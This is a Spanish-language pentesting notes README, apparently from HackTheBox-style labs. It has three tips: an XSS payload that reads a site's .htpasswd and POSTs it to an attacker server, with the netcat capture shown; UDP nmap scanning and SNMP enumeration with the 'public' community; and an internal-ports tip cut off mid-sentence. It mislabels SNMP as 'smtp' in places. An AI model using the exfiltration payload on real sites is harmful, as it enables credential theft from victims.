# 365 Tips De Hacking
En este repo quiero contribuir una vez al día, diariamente publicare una técnica o tip que aprenda, la meta es estudiar diario y aprender algo nuevo cada día, esto lo hago como un registro y por si en algún momento vuelvo a utilizar algo de aqui :p 
## Índice
- [Tip 1:  Lectura de archivos desde un XSS](#tip-1-lectura-de-archivos-desde-un-xss)
- [Tip 2:  Siempre escanea los puertos UDP](#tip-2-siempre-escanea-los-puertos-udp)
- [Tip 3:  Puertos internos abiertos](#tip-3-puertos-internos-abiertos)
## Tip #1: Lectura de archivos desde un XSS
Al descubrir un XSS se puede realizar la lectura de archivos locales mediante peticiones a un servidor web propio, la idea es enviar el XSS payload a un usuario que si pueda acceder a ciertos archivos del servidor, por ejemplo el archivo .htpasswd, a continuación muestro el payload:
```javascript
<script>
fetch("http://ejemplo.com/.htpasswd").then(response => response.text())
  .then(data => fetch("http://<servidor.del.atacante>", {
      method: "POST",
      body: data
  }));
</script>
```
Ahora nosotros nos ponemos a la escucha en ```netcat``` y al enviar el payload al administrador recibiremos el archivo:
```netcat
┌──(jorge㉿pentest)-[~]
└─$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.14.27] from (UNKNOWN) [{redacted}] 48096
POST / HTTP/1.1
Host: 10.10.14.27:1234
Connection: keep-alive
Content-Length: 57
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.111 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: {redacted}
Referer: {redacted}
Accept-Encoding: gzip, deflate

<pre>{redacted}
</pre>
```
## Tip #2: Siempre escanea los puertos UDP
Regularmente en el equipo de Red Team al realizar una auditoria nos enfocamos en los puertos TCP, sin embargo, no viene mal revisar que puertos UDP se encuentran abiertos, algunas veces se puede descubrir información de usuarios y tecnologias que utiliza la organización, por ejemplo en el siguiente escaneo de UDP se descubrio el puerto 161/udp correspondiente a smtp:
```bash
┌──(jorge㉿pentest)-[~]
└─$ /bin/cat PuertosUDP
# Nmap 7.94SVN scan initiated Fri Jan  3 19:46:48 2025 as: /usr/lib/nmap/nmap -p- -sU --min-rate 10000 -n -v -Pn -oN PuertosUDP 10.10.11.48
Warning: 10.10.11.48 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.48
Host is up (0.071s latency).
Not shown: 65459 open|filtered udp ports (no-response), 75 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp

Read data files from: /usr/share/nmap
# Nmap done at Fri Jan  3 19:48:01 2025 -- 1 IP address (1 host up) scanned in 72.81 seconds
```
Despues se utilizo la herramienta ```smtpwalk``` de donde se logro obtener información de las tecnologias de la organización, por ejemplo el uso de daloradius:
```bash
┌──(jorge㉿pentest)-[~]
└─$ snmpwalk -v2c -c public 10.10.11.48
iso.3.6.1.2.1.1.1.0 = STRING: "Linux 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (1394652) 3:52:26.52
iso.3.6.1.2.1.1.5.0 = STRING: "Daloradius server"
iso.3.6.1.2.1.1.6.0 = STRING: "Nevada, U.S.A."
```
## Tip 2: Puertos internos abiertos
Despues de lograr acceso a un equipo es conveniente revisar que puertos abuertos estan en uso, esto por que tal vez uticen softwares que solo son visibles desde el interior a la red, para hacer esto utizamos la herramienta netstat:
